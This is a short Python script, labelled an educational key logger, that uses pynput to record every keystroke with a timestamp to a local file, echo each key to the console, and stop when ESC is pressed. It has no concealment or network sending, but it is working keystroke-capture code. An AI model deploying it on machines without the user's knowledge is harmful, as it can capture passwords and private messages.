from pynput import keyboard
from datetime import datetime

log_file = "keys.log"

def write_log(text):
    with open(log_file, "a") as f:
        f.write(text)

def on_press(key):
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S ")

    try:
        write_log(f"{time}{key.char}\n")
    except AttributeError:
        write_log(f"{time}[{key}]\n")

    print("Key pressed:", key)

def on_release(key):
    if key == keyboard.Key.esc:
        print("Logger stopped")
        return False

print("Educational key logger started (press ESC to stop)")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()